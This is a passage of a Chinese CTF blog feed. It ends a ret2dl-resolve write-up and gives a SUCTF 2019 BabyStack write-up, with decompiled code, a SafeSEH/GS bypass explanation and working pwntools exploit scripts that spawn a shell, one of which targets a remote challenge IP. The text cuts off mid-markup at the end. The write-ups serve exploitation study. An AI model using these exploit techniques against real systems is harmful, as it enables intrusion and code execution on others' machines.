<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure>
<p>这里的st_name比较重要，函数执行到最后会用.dynstr + sym-&gt;st_name得出符号名字符串指针，在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表，最终调用这个函数</p>
<p><img src="/2020/09/03/baby_pwn/6.jpg" alt=".dynsym"></p>
<p>.dynstr存放各种字符串，以’\x00’结尾，在使用过程中按照相对于其基地址的偏移寻址</p>
<p><img src="/2020/09/03/baby_pwn/7.jpg" alt=".dynstr"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>_dl_runtime_resolve函数执行过程：</p>
<ol>
<li><p>用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针</p>
</li>
<li><p>.rel.plt+第二个参数(rel偏移)得到的结果作为rel表项结构体Elf32_Rel的指针，这里记作rel</p>
</li>
<li><p>rel-&gt;r_info &gt;&gt; 8作为.dynsym下标，求出当前函数符号表项Elf32_Sym的指针，记作sym</p>
</li>
<li><p>.dynstr + sym-&gt;st_name得出符号名字符串指针</p>
</li>
<li><p>在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表</p>
</li>
<li><p>调用这个函数</p>
</li>
</ol>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>wiki里从简单到复杂讲了很多种攻击方式，这里可以用的是最后一种，我们先使用栈迁移将ROP代码放到bss段，然后在bss上构造假的rel和sym，rel的r_info为fake_sym与.dynsym的距离，r_offset为read或者alarm，fake_sym的st_name为bss上的’system\x00’与.dynstr的距离，bss上写入’/bin/sh\x00’，传地址进去，这里需要注意的是要在bss_addr+0x800的地方写入数据，为了给函数执行腾出空间</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p,<span class="string">'b* 0x804854a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">    bss_addr = elf.bss()</span><br><span class="line">    log.success(<span class="string">'bss addr =&gt; '</span> + hex(bss_addr))</span><br><span class="line">    offset = <span class="number">0x2c</span></span><br><span class="line">    <span class="comment">#migration </span></span><br><span class="line">    base_stage = bss_addr + <span class="number">0x800</span></span><br><span class="line">    rop.raw(<span class="string">'a'</span>*offset)</span><br><span class="line">    rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">    rop.migrate(base_stage)</span><br><span class="line">    p.sendline(rop.chain())</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">    sh = <span class="string">'/bin/sh'</span></span><br><span class="line">    plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">    rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">    dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">    dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line">    <span class="comment">#design </span></span><br><span class="line">    fake_rel_addr = base_stage + <span class="number">24</span></span><br><span class="line">    fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">    <span class="comment">#size of SYM is 0x10</span></span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> </span><br><span class="line">    r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">    fake_rel = flat([elf.got[<span class="string">'read'</span>],r_info])</span><br><span class="line">    index_rel = (fake_rel_addr-rel_plt) </span><br><span class="line">    st_name = fake_sym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">    fake_sym = flat([st_name,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x12</span>])</span><br><span class="line">    rop.raw(plt0)</span><br><span class="line">    rop.raw(index_rel)<span class="comment">#rel offset</span></span><br><span class="line">    rop.raw(<span class="string">'bbbb'</span>)<span class="comment">#retn addr</span></span><br><span class="line">    rop.raw(base_stage+<span class="number">82</span>)<span class="comment">#binsh_addr</span></span><br><span class="line">    rop.raw(<span class="string">'bbbb'</span>)<span class="comment">#0</span></span><br><span class="line">    rop.raw(<span class="string">'cccc'</span>)<span class="comment">#0</span></span><br><span class="line">    rop.raw(fake_rel)</span><br><span class="line">    rop.raw(<span class="string">'a'</span>*align)</span><br><span class="line">    rop.raw(fake_sym)</span><br><span class="line">    rop.raw(<span class="string">'system\x00'</span>)</span><br><span class="line">    rop.raw((<span class="number">80</span>-len(rop.chain()))*<span class="string">'b'</span>)</span><br><span class="line">    rop.raw(sh+<span class="string">'\x00'</span>)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(rop.chain())</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<p>此外还可以用roputil直接得到填充数据</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">r = process(<span class="string">'./pwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">offset = <span class="number">0x2c</span></span><br><span class="line">bss_base = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">pediy</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#_5" target="_blank" rel="noopener">ctf-wiki</a></p>
]]></content>
      <categories>
        <category>2019信息安全竞赛</category>
      </categories>
  </entry>
  <entry>
    <title>SUCTF 2019</title>
    <url>/2020/09/03/SUCTF2019/</url>
    <content><![CDATA[<h1 id="SUCTF-2019-PWN-writeup"><a href="#SUCTF-2019-PWN-writeup" class="headerlink" title="SUCTF 2019 PWN writeup"></a>SUCTF 2019 PWN writeup</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天SuCT的复盘</p>
<h2 id="BabyStack"><a href="#BabyStack" class="headerlink" title="BabyStack"></a>BabyStack</h2><h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>main函数给出程序加载地址和栈地址，输入一个栈地址(emm自己试了很久)可以触发异常进入magic函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">EH3_EXCEPTION_REGISTRATION</span> *<span class="title">v6</span>;</span> <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// ST38_1</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// ST34_1</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// ST30_1</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// ST2C_1</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// ST28_1</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// ST24_1</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// ST20_1</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// ST1C_1</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// ST04_1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v20; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [esp-10h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp-Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [esp-8h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [esp-4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [esp+0h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [esp+4h] [ebp-2Ch]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [esp+8h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [esp+10h] [ebp-20h]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+18h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">  ms_exc.registration.ScopeTable = (PSCOPETABLE_ENTRY)stru_47ACE0;</span><br><span class="line">  ms_exc.registration.ExceptionHandler = main_func;</span><br><span class="line">  ms_exc.registration.Next = v6;</span><br><span class="line">  v26 = v3;</span><br><span class="line">  v25 = v5;</span><br><span class="line">  v24 = v4;</span><br><span class="line">  ms_exc.old_esp = (DWORD)&amp;v23;</span><br><span class="line">  v29 = <span class="number">0</span>i64;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v8 = sub_4038C3(<span class="number">0</span>);</span><br><span class="line">  sub_4022AC(v8, <span class="number">0</span>);</span><br><span class="line">  v9 = sub_4038C3(<span class="number">1</span>);</span><br><span class="line">  sub_4022AC(v9, <span class="number">0</span>);</span><br><span class="line">  v10 = sub_4038C3(<span class="number">2</span>);</span><br><span class="line">  sub_4022AC(v10, <span class="number">0</span>);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"  ____        _            _____ _             _    \n"</span>, v11);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">" |  _ \\      | |          / ____| |           | |   \n"</span>, v12);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">" | |_) | __ _| |__  _   _| (___ | |_ __ _  ___| | __\n"</span>, v13);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">" |  _ &lt; / _` | '_ \\| | | |\\___ \\| __/ _` |/ __| |/ /\n"</span>, v14);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">" | |_) | (_| | |_) | |_| |____) | || (_| | (__|   &lt; \n"</span>, v15);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">" |____/ \\__,_|_.__/ \\__, |_____/ \\__\\__,_|\\___|_|\\_\\\n"</span>, v16);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"                     __/ |                          \n"</span>, v17);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"                    |___/                           \n"</span>, v18);</span><br><span class="line">  sub_4037E2(<span class="string">"Hello,I will give you some gifts"</span>);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"stack address = 0x%X\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v29);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"main address = 0x%X\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)j_main);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"So,Can You Tell me what did you know?\n"</span>, v19);</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  sub_402482(<span class="string">"%s"</span>, &amp;v29, <span class="number">9</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v29) == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v27 = v20;</span><br><span class="line">      <span class="keyword">if</span> ( v20 &gt;= <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v21 = *((_BYTE *)&amp;v29 + v20);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v21 - <span class="number">48</span>) &gt; <span class="number">9u</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v21 - <span class="number">65</span>) &lt;= <span class="number">5u</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v21 + <span class="number">16</span> * v7 - <span class="number">55</span>;</span><br><span class="line">          v28 = v7;</span><br><span class="line">        &#125;</span><br><span class="line">        ++v20;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = v21 + <span class="number">16</span> * (v7 - <span class="number">3</span>);</span><br><span class="line">        v28 = v7;</span><br><span class="line">        ++v20;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401474((<span class="keyword">int</span>)<span class="string">"You can not find Me!\n"</span>, v25);</span><br><span class="line">    sub_403733(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"Error!\n"</span>, v24);</span><br><span class="line">  sub_403733(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// ST0C_1</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// ST2C_1</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// ST0C_1</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// ST0C_1</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// ST0C_1</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+0h] [ebp-F4h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+0h] [ebp-F4h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+18h] [ebp-DCh]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+1Ch] [ebp-D8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+38h] [ebp-BCh]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+48h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+C8h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+CCh] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+D0h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+D4h] [ebp-20h]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+DCh] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  sub_401E65(&amp;v12, <span class="number">0</span>, <span class="number">0x80</span>);</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"Oops,You find Me!\n"</span>, v7);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"OK,I can tell you something\n"</span>, v0);</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401474((<span class="keyword">int</span>)<span class="string">"Do you want to know more?\n"</span>, v8);</span><br><span class="line">    sub_402482(<span class="string">"%s"</span>, &amp;v12, <span class="number">8</span>);</span><br><span class="line">    sub_4033E1();</span><br><span class="line">    v10 = <span class="built_in">strcmp</span>(&amp;v12, <span class="string">"yes"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">      v10 = -(v10 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="built_in">strcmp</span>(&amp;v12, <span class="string">"no"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">        v9 = -(v9 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v9 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v1 = sub_4038C3(<span class="number">0</span>);</span><br><span class="line">      sub_402C70(&amp;v12, <span class="number">0x100</span>, v1);              <span class="comment">// overflow ebp-0xac</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_401474((<span class="keyword">int</span>)<span class="string">"Where do you want to know?\n"</span>, v8);</span><br><span class="line">      sub_402482(<span class="string">"%s"</span>, &amp;v13, <span class="number">0x10</span>);</span><br><span class="line">      v2 = sub_4019F6(&amp;v13);</span><br><span class="line">      sub_401474((<span class="keyword">int</span>)<span class="string">"Address 0x%X value is 0x%X\n"</span>, v2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"Now,I will tell you 1 + 1 = 3!\n"</span>, v8);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"Oh,no!\n"</span>, v3);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"You don't believe 1 + 1 = 3???\n"</span>, v4);</span><br><span class="line">  sub_401474((<span class="keyword">int</span>)<span class="string">"You do calculation like cxk!!!\n"</span>, v5);</span><br><span class="line">  <span class="keyword">return</span> sub_403733(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>magic函数中存在后门，由于有SafeSEH的保护，不能直接覆盖SEH到后门地址，每次系统重启，程序加载的地址才会变化，因此一次开机程序的加载地址就固定了，下面的exp都是基于这个写的。</p>
<p>这道题几乎是HITB的原题，在看雪找了篇帖子学习<br><a href="https://bbs.pediy.com/thread-221016.htm" target="_blank" rel="noopener">看雪</a></p>
<p>magic函数存在溢出，我们按照帖子里的分析伪造一个假的scope table以及FilterFunc(和HandleFunc一样都会执行)，泄露出GS、Security Cookie以及GS后面的2个值，SEH NEXT，payload结构如下:<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span>+p32(<span class="number">0xffffffe4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xffffff0c</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xfffffffe</span>)</span><br><span class="line">payload += p32(system_addr)*<span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">'b'</span>)</span><br><span class="line">payload += GS</span><br><span class="line">payload += canary_1</span><br><span class="line">payload += canary2</span><br><span class="line">payload += SEH_NEXT</span><br><span class="line">payload += p32(SEH Handler)</span><br><span class="line">payload += p32(SecurityCookie^(input_addr+<span class="number">4</span>))</span><br></pre></td></tr></table></figure></p>
<p>这里几个比较重要的地址：Security Cookie在0x47c004，GS在ebp-0x1c处，canary_1在ebp-0x18，canary_2在ebp-0x14，canary_3在ebp-0x10处</p>
<p>泄露的地址-0x20为ebp_addr</p>
<p>输入的地址为ebp_addr-0xac</p>
<p>上述地址的推断来自于OD调试，下断点，算偏移即可，例如：</p>
<p>泄露地址为0xb3f8f4，调试可以看到ebp_addr为leak_addr - 0x20 = 0xB3F8D4</p>
<p><img src="/2020/09/03/SUCTF2019/1.jpg" alt="cookie"></p>
<p><img src="/2020/09/03/SUCTF2019/2.png" alt="debug"></p>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><p>本地拿看雪师傅的辅助脚本跑失败了，Su那边服务器又关了，这里直接拿17师傅的脚本了，看了下payload结构应该没什么大的出入</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'121.40.159.66'</span>, <span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'stack address = '</span>)</span><br><span class="line">stack_base = p.recvuntil(<span class="string">'\r\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">stack_base = int(stack_base, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'main address = '</span>)</span><br><span class="line">exe_base = p.recvuntil(<span class="string">'\r\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">exe_base = int(exe_base, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">security = exe_base + (<span class="number">0x47C004</span> - <span class="number">0x40395e</span>)</span><br><span class="line"></span><br><span class="line">overflow_addr = stack_base - (<span class="number">0xcffaa8</span> - <span class="number">0xcff9dc</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'So,Can You Tell me what did you know?\r\n'</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'0x800000\n'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Do you want to know more?\r\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Do you want to know more?\r\n'</span>, <span class="string">'yes'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Where do you want to know?\r\n'</span>, str(security))</span><br><span class="line">recv = p.recvuntil(<span class="string">'value is '</span>)</span><br><span class="line">recv = p.recvuntil(<span class="string">'\r\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">security_cookie = int(recv, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(security_cookie)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Do you want to know more?\r\n'</span>, <span class="string">'yes'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Where do you want to know?\r\n'</span>, str(stack_base - <span class="number">0x30</span>))</span><br><span class="line">recv = p.recvuntil(<span class="string">'value is '</span>)</span><br><span class="line">recv = p.recvuntil(<span class="string">'\r\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">canary = int(recv, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Do you want to know more?\r\n'</span>, <span class="string">'yes'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Where do you want to know?\r\n'</span>, str(stack_base - <span class="number">0x30</span> - <span class="number">0xc</span>))</span><br><span class="line">recv = p.recvuntil(<span class="string">'value is '</span>)</span><br><span class="line">recv = p.recvuntil(<span class="string">'\r\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">canary_1 = int(recv, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Do you want to know more?\r\n'</span>, <span class="string">'yes'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Where do you want to know?\r\n'</span>, str(stack_base - <span class="number">0x30</span> - <span class="number">0x8</span>))</span><br><span class="line">recv = p.recvuntil(<span class="string">'value is '</span>)</span><br><span class="line">recv = p.recvuntil(<span class="string">'\r\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">canary_2 = int(recv, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Do you want to know more?\r\n'</span>, <span class="string">'yes'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Where do you want to know?\r\n'</span>, str(stack_base - <span class="number">0x30</span> - <span class="number">0x4</span>))</span><br><span class="line">recv = p.recvuntil(<span class="string">'value is '</span>)</span><br><span class="line">recv = p.recvuntil(<span class="string">'\r\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">canary_3 = int(recv, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">target = exe_base + (<span class="number">0x408266</span> - <span class="number">0x40395e</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span> * <span class="number">0x10</span> + p32(<span class="number">0xffffffe4</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xFFFFFF0C</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xFFFFFFFE</span>) + p32(exe_base + (<span class="number">0x408224</span> - <span class="number">0x40395e</span>)) + p32(target)</span><br><span class="line">payload = payload.ljust(<span class="number">0x90</span>, <span class="string">'\x00'</span>) + p32(canary_1) + p32(canary_2) + p32(canary_3)</span><br><span class="line">payload += p32(canary) + p32(exe_base + (<span class="number">0x7d9a30</span> - <span class="number">0x7d395e</span>)) + p32( (overflow_addr + <span class="number">0x10</span>) ^ security_cookie  ) + p32(<span class="number">0</span>) + p32(stack_base)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Do you want to know more?\r\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span 